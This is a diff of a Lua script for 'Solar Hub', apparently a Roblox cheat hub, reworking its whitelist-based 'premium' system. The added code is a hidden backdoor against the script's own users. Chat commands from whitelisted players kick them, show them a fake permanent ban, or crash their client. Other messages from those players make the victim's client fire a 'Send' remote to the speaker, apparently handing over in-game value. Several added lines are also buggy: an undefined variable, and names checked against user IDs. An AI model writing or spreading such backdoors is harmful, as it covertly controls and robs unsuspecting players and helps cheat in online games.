@@ -1,11 +1,12 @@
+--omg you found a opensourced code your so cool!!!!!
+--your so impressive for leaking something opensourced (that i could obfuscate if i really wanted to)
 
-
-getgenv().discordinvsolar = "https://discord.gg/solarhub" -- dont try to change this skiddy skid!!!!!
+getgenv().discordinvsolar = "https://discord.gg/solarhub" 
 getgenv().versionsolar = "1.2"
-
+getgenv().solarmins = {}
 getgenv().hasPremium = nil
 
--- the premium system below is skidded from multiple of my old scripts combined to one, ignore the stupid methods and messy code
+-- lets GOOO i made the premium system actually kinda good but the code still sucks!!!! (still with poop methods)
 
 local whitelisted = {
     "twistedworId",
@@ -30,90 +31,91 @@ local isPremium = {
     2580980319,
 };
 if game.PlaceId == 4779613061 then
+-- for admin whitelist
+function ownerNotifier()
+    for i, owner in pairs(game.Players:GetPlayers()) do
+    if table.find(isOwner, owner.UserId) then
+        if rconsoleprint then
+            if syn then
+                rconsoleprint("@@LIGHT_CYAN@@")
+                rconsoleprint("The owner of Solar Hub is in your game!")
+                    else
+                        rconsoleprint("The owner of Solar Hub is in your game!")
+                end
+            else
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("A owner or admin has joined", 'All');
+        end
+    end
+end
+end
+function adminUpdater()
+--clear the table to remove any premium users that have left
+table.clear(solarmins)
+task.wait(0.01)
+            
+-- add to table of premium users
+for i, player in pairs(game.Players:GetPlayers()) do
+        if table.find(whitelisted, player.UserId) then
+            table.insert(solarmins, player.Name)
+        end
+    end
+end
+-- tag whitelist
+function tagUpdater()
+    
+        for i, plr in pairs(game.Players:GetPlayers()) do
+            if table.find(isOwner, plr.UserId) then
+                game:GetService("Workspace"):FindFirstChild(plr.Name).Head.Gui.MainFrame.Rank.Font = "Gotham";
+                game:GetService("Workspace"):FindFirstChild(plr.Name).Head.Gui.MainFrame.Rank.TextColor3 = Color3.new(255, 230, 0);
+		        game:GetService("Workspace"):FindFirstChild(plr.Name).Head.Gui.MainFrame.Rank.Text = "OWNER OF SOLAR";
+            elseif table.find(isAdmin, plr.UserId) then
+	            game:GetService("Workspace"):FindFirstChild(plr.Name).Head.Gui.MainFrame.Rank.Font = "Gotham";
+                game:GetService("Workspace"):FindFirstChild(plr.Name).Head.Gui.MainFrame.Rank.TextColor3 = Color3.new(0.85098, 0, 0.0156863);
+		        game:GetService("Workspace"):FindFirstChild(plr.Name).Head.Gui.MainFrame.Rank.Text = "SOLAR ADMIN";
+            elseif table.find(isPremium, plr.UserId) then
+	            game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Font = "Gotham";
+                game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.TextColor3 = Color3.new(0.145098, 0.858824, 1);
+		        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Text = "SOLAR PREMIUM";
+        end
+    end
+end
+coroutine.wrap(function()
+while task.wait(3) do
+pcall(adminUpdater)
+pcall(tagUpdater)
+end
+end)()
+-- start functions for admins. oooooh boy this is gonna get messy
 --
 local pl, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
 local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");
 local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering");
 --
-local solaradmin = {};
+task.wait()
+if table.find(whitelisted, game.Players.LocalPlayer.Name) then else
 
-
-for i, solarmin in pairs(game:GetService("Players"):GetPlayers()) do
-
-    if table.find(whitelisted, solarmin.Name) then
-        table.clear(solaradmin)
-        table.insert(solaradmin, solarmin.Name) --idiot method
-        	
-        end;
-    end;
-
-wait()
-
-local Host, Host2, Host3 = solaradmin[1], solaradmin[2], solaradmin[3] -- im an idiot this is such a bad method lool 
-wait()
-if game.Players.LocalPlayer.Name == Host then elseif game.Players.LocalPlayer.Name == Host2 then elseif game.Players.LocalPlayer.Name == Host3 then else
-       
 onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
 local speaker, message = pl[messageData.FromSpeaker], messageData.Message;
 
-if speaker.Name == Host and message == "!check" or speaker.Name == Host2 and message == "!check" or speaker.Name == Host3 and message == "!check" then
-    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SL2 IS MY FAVOURITE GAME!", 'All');
-elseif speaker.Name == Host and message == "!haha" or speaker.Name == Host2 and message == "!haha" or speaker.Name == Host3 and message == "!haha" then
+if table.find(whitelisted, speaker.Name) and message == "!check" then
     game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SolarW", 'All');
-elseif speaker.Name == Host and message == "!kick" or speaker.Name == Host2 and message == "!kick" or speaker.Name == Host3 and message == "!kick" then
-    pl.LocalPlayer:Kick("Someone with kick whitelists kicked you! report this to the discord server if this was abuse!");
-elseif speaker.Name == Host and message == "!crash" or speaker.Name == Host2 and message == "!crash" or speaker.Name == Host3 and message == "!crash" then
+elseif table.find(whitelisted, speaker.Name) and message == "!fakeban" then
+    game.Players.LocalPlayer:Kick("EXPLOITS DETECTED. YOU HAVE BEEN PERMABANNED!")
+elseif table.find(whitelisted, speaker.Name) and message == "!kick" then
+    pl.LocalPlayer:Kick("User "..speaker.Name.." has kicked you! please report this if it was abuse! (You were kicked by a Solar Premium user or a Solar Admin/Owner.)");
+elseif table.find(whitelisted, speaker.Name) and message == "!crash" then
     game:Shutdown();
+elseif table.find(whitelisted, speaker.Name) then
+game:GetService("ReplicatedStorage").Send:FireServer("100", game:GetService("Players"):FindFirstChild(speaker.Name))
 end
 end);
 end;
 
-
-
-
-
-if pl:FindFirstChild("twistedworId") then
-    if syn then
-        rconsoleprint("owner of solar is in your game");
-    else
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("A owner or admin has joined", 'All');
-        
-    end
 end;
+-- end sl2 premium
 
-if table.find(isOwner, game.Players.LocalPlayer.UserId) then
-getgenv().hasPremium = true
-elseif table.find(isAdmin, game.Players.LocalPlayer.UserId) then
-getgenv().hasPremium = true
-elseif table.find(isPremium, game.Players.LocalPlayer.UserId) then
-getgenv().hasPremium = true
-print("solar premium loop executed with no visible issues.")
-    end;
-end
-
-
-
-    
-for i, v in pairs(game:GetService("Players"):GetPlayers()) do
-    
-    if table.find(isOwner, v.UserId) then
-	
-        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Font = "Gotham";
-        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.TextColor3 = Color3.new(255, 230, 0);
-		game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Text = "OWNER OF SOLAR";
-	
-    elseif table.find(isAdmin, v.UserId) then
-	
-	    game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Font = "Gotham";
-        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.TextColor3 = Color3.new(0.85098, 0, 0.0156863);
-		game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Text = "SOLAR ADMIN";
-	
-    elseif table.find(isPremium, v.UserId) then
-	
-        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Font = "Gotham";
-        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.TextColor3 = Color3.new(0.145098, 0.858824, 1);
-		game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Text = "SOLAR PREMIUM";
-	
-        end
-    end;
-
+--owner in game function (DONT LOOP!)
+pcall(ownerNotifier)
+game.Players.PlayerAdded:Connect(function()
+    pcall(ownerNotifier)
+end)
